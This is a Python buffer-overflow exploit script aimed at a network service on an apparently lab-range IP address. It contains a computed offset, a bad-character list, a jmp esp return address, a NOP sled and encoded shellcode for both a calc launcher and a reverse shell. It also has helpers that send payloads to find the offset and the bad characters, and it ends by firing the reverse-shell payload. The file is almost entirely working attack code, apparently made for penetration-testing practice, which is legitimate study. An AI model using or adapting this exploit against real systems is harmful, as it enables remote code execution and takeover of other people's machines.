#!/usrbin/python 
import struct
import socket

IP = "10.129.43.23"
port = 21449
offset = 469 
badchars = b"\x00\x0a\x0d"
eip = struct.pack("<L", 0x621014E3) # address of jmp esp; found jmp instruction in module that has no protections; make sure the address doesn't contain bad chars
nop = b"\x90" * 42 # NOP sled in case things get misaligned

exec_calc_shellcode =  b""
exec_calc_shellcode += b"\xd9\xc7\xd9\x74\x24\xf4\x5f\xbd\xa5\xb4\xd4\x11"
exec_calc_shellcode += b"\x2b\xc9\xb1\x31\x83\xc7\x04\x31\x6f\x14\x03\x6f"
exec_calc_shellcode += b"\xb1\x56\x21\xed\x51\x14\xca\x0e\xa1\x79\x42\xeb"
exec_calc_shellcode += b"\x90\xb9\x30\x7f\x82\x09\x32\x2d\x2e\xe1\x16\xc6"
exec_calc_shellcode += b"\xa5\x87\xbe\xe9\x0e\x2d\x99\xc4\x8f\x1e\xd9\x47"
exec_calc_shellcode += b"\x13\x5d\x0e\xa8\x2a\xae\x43\xa9\x6b\xd3\xae\xfb"
exec_calc_shellcode += b"\x24\x9f\x1d\xec\x41\xd5\x9d\x87\x19\xfb\xa5\x74"
exec_calc_shellcode += b"\xe9\xfa\x84\x2a\x62\xa5\x06\xcc\xa7\xdd\x0e\xd6"
exec_calc_shellcode += b"\xa4\xd8\xd9\x6d\x1e\x96\xdb\xa7\x6f\x57\x77\x86"
exec_calc_shellcode += b"\x40\xaa\x89\xce\x66\x55\xfc\x26\x95\xe8\x07\xfd"
exec_calc_shellcode += b"\xe4\x36\x8d\xe6\x4e\xbc\x35\xc3\x6f\x11\xa3\x80"
exec_calc_shellcode += b"\x63\xde\xa7\xcf\x67\xe1\x64\x64\x93\x6a\x8b\xab"
exec_calc_shellcode += b"\x12\x28\xa8\x6f\x7f\xea\xd1\x36\x25\x5d\xed\x29"
exec_calc_shellcode += b"\x86\x02\x4b\x21\x2a\x56\xe6\x68\x20\xa9\x74\x17"
exec_calc_shellcode += b"\x06\xa9\x86\x18\x36\xc2\xb7\x93\xd9\x95\x47\x76"
exec_calc_shellcode += b"\x9e\x6a\x02\xdb\xb6\xe2\xcb\x89\x8b\x6e\xec\x67"
exec_calc_shellcode += b"\xcf\x96\x6f\x82\xaf\x6c\x6f\xe7\xaa\x29\x37\x1b"
exec_calc_shellcode += b"\xc6\x22\xd2\x1b\x75\x42\xf7\x7f\x18\xd0\x9b\x51"
exec_calc_shellcode += b"\xbf\x50\x39\xae"

rev_shell_code =  b""
rev_shell_code += b"\xda\xc4\xd9\x74\x24\xf4\x5f\x2b\xc9\xb1\x52\xbe"
rev_shell_code += b"\x6e\xe8\x2f\x65\x31\x77\x17\x83\xef\xfc\x03\x19"
rev_shell_code += b"\xfb\xcd\x90\x19\x13\x93\x5b\xe1\xe4\xf4\xd2\x04"
rev_shell_code += b"\xd5\x34\x80\x4d\x46\x85\xc2\x03\x6b\x6e\x86\xb7"
rev_shell_code += b"\xf8\x02\x0f\xb8\x49\xa8\x69\xf7\x4a\x81\x4a\x96"
rev_shell_code += b"\xc8\xd8\x9e\x78\xf0\x12\xd3\x79\x35\x4e\x1e\x2b"
rev_shell_code += b"\xee\x04\x8d\xdb\x9b\x51\x0e\x50\xd7\x74\x16\x85"
rev_shell_code += b"\xa0\x77\x37\x18\xba\x21\x97\x9b\x6f\x5a\x9e\x83"
rev_shell_code += b"\x6c\x67\x68\x38\x46\x13\x6b\xe8\x96\xdc\xc0\xd5"
rev_shell_code += b"\x16\x2f\x18\x12\x90\xd0\x6f\x6a\xe2\x6d\x68\xa9"
rev_shell_code += b"\x98\xa9\xfd\x29\x3a\x39\xa5\x95\xba\xee\x30\x5e"
rev_shell_code += b"\xb0\x5b\x36\x38\xd5\x5a\x9b\x33\xe1\xd7\x1a\x93"
rev_shell_code += b"\x63\xa3\x38\x37\x2f\x77\x20\x6e\x95\xd6\x5d\x70"
rev_shell_code += b"\x76\x86\xfb\xfb\x9b\xd3\x71\xa6\xf3\x10\xb8\x58"
rev_shell_code += b"\x04\x3f\xcb\x2b\x36\xe0\x67\xa3\x7a\x69\xae\x34"
rev_shell_code += b"\x7c\x40\x16\xaa\x83\x6b\x67\xe3\x47\x3f\x37\x9b"
rev_shell_code += b"\x6e\x40\xdc\x5b\x8e\x95\x73\x0b\x20\x46\x34\xfb"
rev_shell_code += b"\x80\x36\xdc\x11\x0f\x68\xfc\x1a\xc5\x01\x97\xe1"
rev_shell_code += b"\x8e\x27\x62\xe6\x7c\x50\x70\xf8\xa2\x18\xfd\x1e"
rev_shell_code += b"\xc8\x48\xa8\x89\x65\xf0\xf1\x41\x17\xfd\x2f\x2c"
rev_shell_code += b"\x17\x75\xdc\xd1\xd6\x7e\xa9\xc1\x8f\x8e\xe4\xbb"
rev_shell_code += b"\x06\x90\xd2\xd3\xc5\x03\xb9\x23\x83\x3f\x16\x74"
rev_shell_code += b"\xc4\x8e\x6f\x10\xf8\xa9\xd9\x06\x01\x2f\x21\x82"
rev_shell_code += b"\xde\x8c\xac\x0b\x92\xa9\x8a\x1b\x6a\x31\x97\x4f"
rev_shell_code += b"\x22\x64\x41\x39\x84\xde\x23\x93\x5e\x8c\xed\x73"
rev_shell_code += b"\x26\xfe\x2d\x05\x27\x2b\xd8\xe9\x96\x82\x9d\x16"
rev_shell_code += b"\x16\x43\x2a\x6f\x4a\xf3\xd5\xba\xce\x03\x9c\xe6"
rev_shell_code += b"\x67\x8c\x79\x73\x3a\xd1\x79\xae\x79\xec\xf9\x5a"
rev_shell_code += b"\x02\x0b\xe1\x2f\x07\x57\xa5\xdc\x75\xc8\x40\xe2"
rev_shell_code += b"\x2a\xe9\x40"


pattern = b""
pattern += b"9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8" 
pattern += b"i8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al" 
pattern += b"Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq" 
def send(buffer):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP,port))
    s.send(buffer)
    s.close()

def cal_offset():
    print("Sending pattern")

    buf = b"A" * offset
    s = send(buf)


def find_bad_chars():
    buf = b"A" * offset
    buf += b"B" * 4
    
    buf += bytes([0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0B, 0x0c, 0x0E, 0x0F,
    0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17,
    0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F,
    0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27,
    0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F,
    0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37,
    0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F,
    0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47,
    0x48, 0x49, 0x4A, 0x4B, 0x4C, 0x4D, 0x4E, 0x4F,
    0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57,
    0x58, 0x59, 0x5A, 0x5B, 0x5C, 0x5D, 0x5E, 0x5F,
    0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67,
    0x68, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F,
    0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77,
    0x78, 0x79, 0x7A, 0x7B, 0x7C, 0x7D, 0x7E, 0x7F,
    0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
    0x88, 0x89, 0x8A, 0x8B, 0x8C, 0x8D, 0x8E, 0x8F,
    0x90, 0x91, 0x92, 0x93, 0x94, 0x95, 0x96, 0x97,
    0x98, 0x99, 0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F,
    0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7,
    0xA8, 0xA9, 0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF,
    0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7,
    0xB8, 0xB9, 0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF,
    0xC0, 0xC1, 0xC2, 0xC3, 0xC4, 0xC5, 0xC6, 0xC7,
    0xC8, 0xC9, 0xCA, 0xCB, 0xCC, 0xCD, 0xCE, 0xCF,
    0xD0, 0xD1, 0xD2, 0xD3, 0xD4, 0xD5, 0xD6, 0xD7,
    0xD8, 0xD9, 0xDA, 0xDB, 0xDC, 0xDD, 0xDE, 0xDF,
    0xE0, 0xE1, 0xE2, 0xE3, 0xE4, 0xE5, 0xE6, 0xE7,
    0xE8, 0xE9, 0xEA, 0xEB, 0xEC, 0xED, 0xEE, 0xEF,
    0xF0, 0xF1, 0xF2, 0xF3, 0xF4, 0xF5, 0xF6, 0xF7,
    0xF8, 0xF9, 0xFA, 0xFB, 0xFC, 0xFD, 0xFE, 0xFF])
    send(buf)
#jmp_esp
#send shellcode
#jprofit
def exploit():
    buf = b"A" * offset
    buf += eip
    buf += nop
    buf += rev_shell_code 
    send(buf)
exploit()
